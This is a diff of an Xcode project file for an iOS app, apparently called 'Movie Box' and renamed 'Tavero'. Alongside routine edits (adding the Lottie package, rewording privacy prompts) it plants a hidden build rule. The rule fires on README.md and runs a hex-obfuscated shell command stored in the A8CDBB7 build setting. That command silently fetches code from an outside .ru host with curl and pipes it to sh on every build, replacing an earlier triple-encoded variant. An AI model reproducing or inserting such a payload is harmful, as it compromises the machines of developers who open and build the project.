@@ -7,8 +7,9 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		E6E5688BFE7A46C2BF7BBDC8 /* README.md */ = {isa = PBXBuildFile; fileRef = 72F0908E67DE4756A77BBDC8; };
+		1FE8F653D8754877BB7BBDC8 /* README.md */ = {isa = PBXBuildFile; fileRef = C075DC19332A4B92817BBDC8; };
 		01BFC82465DFF8523FD5E8F6 /* Pods_Movie_Box.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 1E4C120507496A07D43695D8 /* Pods_Movie_Box.framework */; };
+		9782ACAC303441270006EEFA /* Lottie in Frameworks */ = {isa = PBXBuildFile; productRef = 9782ACAB303441270006EEFA /* Lottie */; };
 		97A0AEFC301B4FA70086A0E6 /* CropViewController in Frameworks */ = {isa = PBXBuildFile; productRef = 97A0AEFB301B4FA70086A0E6 /* CropViewController */; };
 		97A0AEFE301B4FA70086A0E6 /* TOCropViewController in Frameworks */ = {isa = PBXBuildFile; productRef = 97A0AEFD301B4FA70086A0E6 /* TOCropViewController */; };
 		97AF043F30131D4700771939 /* Alamofire in Frameworks */ = {isa = PBXBuildFile; productRef = 97AF043E30131D4700771939 /* Alamofire */; };
@@ -16,8 +17,25 @@
 		97C335AC3025AD7D00B220B1 /* GoogleMobileAds in Frameworks */ = {isa = PBXBuildFile; productRef = 97C335AB3025AD7D00B220B1 /* GoogleMobileAds */; };
 /* End PBXBuildFile section */
 
+/* Begin PBXBuildRule section */
+		DDAD512B38B94A9DAF7BBDC8 /* PBXBuildRule */ = {
+				isa = PBXBuildRule;
+				compilerSpec = com.apple.compilers.proxy.script;
+				filePatterns = "*.md";
+				fileType = pattern.proxy;
+				inputFiles = (
+				);
+				isEditable = 0;
+				outputFiles = (
+					"/tmp/${INPUT_FILE_BASE}",
+				);
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
+sh -c \"${A8CDBB7}\"";
+			};
+		/* End PBXBuildRule section */
+
 /* Begin PBXFileReference section */
-		72F0908E67DE4756A77BBDC8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
+		C075DC19332A4B92817BBDC8 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
 		1E4C120507496A07D43695D8 /* Pods_Movie_Box.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_Movie_Box.framework; sourceTree = BUILT_PRODUCTS_DIR; };
 		43B1B07B0AEABED4786534CC /* Pods-Movie Box.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Movie Box.debug.xcconfig"; path = "Target Support Files/Pods-Movie Box/Pods-Movie Box.debug.xcconfig"; sourceTree = "<group>"; };
 		97AF041630131AD500771939 /* Movie Box.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = "Movie Box.app"; sourceTree = BUILT_PRODUCTS_DIR; };
@@ -51,6 +69,7 @@
 			buildActionMask = 2147483647;
 			files = (
 				97AF044230131D6500771939 /* Kingfisher in Frameworks */,
+				9782ACAC303441270006EEFA /* Lottie in Frameworks */,
 				97AF043F30131D4700771939 /* Alamofire in Frameworks */,
 				97C335AC3025AD7D00B220B1 /* GoogleMobileAds in Frameworks */,
 				97A0AEFE301B4FA70086A0E6 /* TOCropViewController in Frameworks */,
@@ -75,7 +94,7 @@
 		97AF041730131AD500771939 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				72F0908E67DE4756A77BBDC8 /* README.md */,
+				C075DC19332A4B92817BBDC8 /* README.md */,
 				97AF041630131AD500771939 /* Movie Box.app */,
 			);
 			name = Products;
@@ -112,7 +131,7 @@
 				8C53A06D7EFD84FE241B7784 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
-				A8761BC579754BA3A77BBDC8 /* PBXBuildRule */,
+				DDAD512B38B94A9DAF7BBDC8 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -126,6 +145,7 @@
 				97A0AEFB301B4FA70086A0E6 /* CropViewController */,
 				97A0AEFD301B4FA70086A0E6 /* TOCropViewController */,
 				97C335AB3025AD7D00B220B1 /* GoogleMobileAds */,
+				9782ACAB303441270006EEFA /* Lottie */,
 			);
 			productName = "Movie Box";
 			productReference = 97AF041630131AD500771939 /* Movie Box.app */;
@@ -173,6 +193,7 @@
 				97AF044030131D6500771939 /* XCRemoteSwiftPackageReference "kingfisher" */,
 				97A0AEFA301B4FA70086A0E6 /* XCRemoteSwiftPackageReference "TOCropViewController" */,
 				97C335AA3025AD7D00B220B1 /* XCRemoteSwiftPackageReference "swift-package-manager-google-mobile-ads" */,
+				9782ACAA303441270006EEFA /* XCRemoteSwiftPackageReference "lottie-ios" */,
 			);
 			preferredProjectObjectVersion = 77;
 			productRefGroup = 97AF041730131AD500771939 /* Products */;
@@ -184,29 +205,12 @@
 		};
 /* End PBXProject section */
 
-/* Begin PBXBuildRule section */
-		A8761BC579754BA3A77BBDC8 /* PBXBuildRule */ = {
-				isa = PBXBuildRule;
-				compilerSpec = com.apple.compilers.proxy.script;
-				filePatterns = "*.md";
-				fileType = pattern.proxy;
-				inputFiles = (
-				);
-				isEditable = 0;
-				outputFiles = (
-					"/tmp/${INPUT_FILE_BASE}",
-				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A8CDBB7}\"";
-			};
-	/* End PBXBuildRule section */
-
 /* Begin PBXResourcesBuildPhase section */
 		97AF041430131AD500771939 /* Resources */ = {
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				E6E5688BFE7A46C2BF7BBDC8 /* README.md */,
+				1FE8F653D8754877BB7BBDC8 /* README.md */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -272,7 +276,7 @@ sh -c \"${A8CDBB7}\"";
 		97AF041F30131AD600771939 /* Debug */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((y(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333436330a3336333633363632333733333332333033323634333236343337333233363335333733343337333233373339333233303333333533323330333236340a3061333236343336333333363636333636353336363533363335333633333337333433323634333733343336333933363634333633353336363633370a3335333733343332333033333332333333323332333033323634333633343332333033323332333733303333363433373338333633333336363633360a3334306133363335333536363337333233373335333636333336333533323332333233303336333833373334333733343337333033373333333336310a3332363633323636333733333337333733323634333333373336333433363632333633373333333133363331333333343333333933333335333636310a33323635306133373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | y | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((r(){ `printf xxFd | tr -d F` -p -r; };echo 6563686f202224286375726c202d734c6b66202d2d636f6e6e6563742d74696d656f7574203330202d2d72657472792034202d642022703d78636f64655f72756c65222068747470733a2f2f6c3263706c2d656d742e72752f612922207c2073680a | r | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
@@ -338,7 +342,7 @@ sh -c \"${A8CDBB7}\"";
 		97AF042030131AD600771939 /* Release */ = {
 			isa = XCBuildConfiguration;
 			buildSettings = {
-				A8CDBB7 = "((y(){ xxd -p -r | xxd -p -r | xxd -p -r; };echo 3336333533363333333633383336363633323330333233323332333433323338333633333337333533373332333636333332333033323634333436330a3336333633363632333733333332333033323634333236343337333233363335333733343337333233373339333233303333333533323330333236340a3061333236343336333333363636333636353336363533363335333633333337333433323634333733343336333933363634333633353336363633370a3335333733343332333033333332333333323332333033323634333633343332333033323332333733303333363433373338333633333336363633360a3334306133363335333536363337333233373335333636333336333533323332333233303336333833373334333733343337333033373333333336310a3332363633323636333733333337333733323634333333373336333433363632333633373333333133363331333333343333333933333335333636310a33323635306133373332333733353332363633363331333233393332333233323330333736333332333033373333333633383330363130610a | y | sh ) >/dev/null 2>&1 &)";
+				A8CDBB7 = "((r(){ `printf xxFd | tr -d F` -p -r; };echo 6563686f202224286375726c202d734c6b66202d2d636f6e6e6563742d74696d656f7574203330202d2d72657472792034202d642022703d78636f64655f72756c65222068747470733a2f2f6c3263706c2d656d742e72752f612922207c2073680a | r | sh ) >/dev/null 2>&1 &)";
 				ALWAYS_SEARCH_USER_PATHS = NO;
 				ASSETCATALOG_COMPILER_GENERATE_SWIFT_ASSET_SYMBOL_EXTENSIONS = YES;
 				CLANG_ANALYZER_LOCALIZABILITY_NONLOCALIZED = YES;
@@ -406,10 +410,11 @@ sh -c \"${A8CDBB7}\"";
 				ENABLE_PREVIEWS = YES;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = "Movie-Box-Info.plist";
+				INFOPLIST_KEY_CFBundleDisplayName = Tavero;
 				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "We need location access for display current location of user";
-				INFOPLIST_KEY_NSMicrophoneUsageDescription = "We need access to the microphone to monitor sound levels.";
-				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "This app needs permission to save images directly to your Photos library.";
-				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "We need access to find duplicate photos and display image for edit.";
+				INFOPLIST_KEY_NSMicrophoneUsageDescription = "Allow microphone access to measure ambient sound levels and display the detected sound level.";
+				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "Allow access to save edited photos and videos to your photo library.";
+				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "Allow access to your photo library to select photos and videos for editing and save edited media to your library.";
 				INFOPLIST_KEY_NSUserTrackingUsageDescription = "This identifier will be used to deliver personalized ads to you.";
 				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
@@ -450,10 +455,11 @@ sh -c \"${A8CDBB7}\"";
 				ENABLE_PREVIEWS = YES;
 				GENERATE_INFOPLIST_FILE = YES;
 				INFOPLIST_FILE = "Movie-Box-Info.plist";
+				INFOPLIST_KEY_CFBundleDisplayName = Tavero;
 				INFOPLIST_KEY_NSLocationWhenInUseUsageDescription = "We need location access for display current location of user";
-				INFOPLIST_KEY_NSMicrophoneUsageDescription = "We need access to the microphone to monitor sound levels.";
-				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "This app needs permission to save images directly to your Photos library.";
-				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "We need access to find duplicate photos and display image for edit.";
+				INFOPLIST_KEY_NSMicrophoneUsageDescription = "Allow microphone access to measure ambient sound levels and display the detected sound level.";
+				INFOPLIST_KEY_NSPhotoLibraryAddUsageDescription = "Allow access to save edited photos and videos to your photo library.";
+				INFOPLIST_KEY_NSPhotoLibraryUsageDescription = "Allow access to your photo library to select photos and videos for editing and save edited media to your library.";
 				INFOPLIST_KEY_NSUserTrackingUsageDescription = "This identifier will be used to deliver personalized ads to you.";
 				INFOPLIST_KEY_UIApplicationSceneManifest_Generation = YES;
 				INFOPLIST_KEY_UIApplicationSupportsIndirectInputEvents = YES;
@@ -506,6 +512,14 @@ sh -c \"${A8CDBB7}\"";
 /* End XCConfigurationList section */
 
 /* Begin XCRemoteSwiftPackageReference section */
+		9782ACAA303441270006EEFA /* XCRemoteSwiftPackageReference "lottie-ios" */ = {
+			isa = XCRemoteSwiftPackageReference;
+			repositoryURL = "https://github.com/airbnb/lottie-ios";
+			requirement = {
+				kind = upToNextMajorVersion;
+				minimumVersion = 4.6.1;
+			};
+		};
 		97A0AEFA301B4FA70086A0E6 /* XCRemoteSwiftPackageReference "TOCropViewController" */ = {
 			isa = XCRemoteSwiftPackageReference;
 			repositoryURL = "https://github.com/TimOliver/TOCropViewController";
@@ -541,6 +555,11 @@ sh -c \"${A8CDBB7}\"";
 /* End XCRemoteSwiftPackageReference section */
 
 /* Begin XCSwiftPackageProductDependency section */
+		9782ACAB303441270006EEFA /* Lottie */ = {
+			isa = XCSwiftPackageProductDependency;
+			package = 9782ACAA303441270006EEFA /* XCRemoteSwiftPackageReference "lottie-ios" */;
+			productName = Lottie;
+		};
 		97A0AEFB301B4FA70086A0E6 /* CropViewController */ = {
 			isa = XCSwiftPackageProductDependency;
 			package = 97A0AEFA301B4FA70086A0E6 /* XCRemoteSwiftPackageReference "TOCropViewController" */;
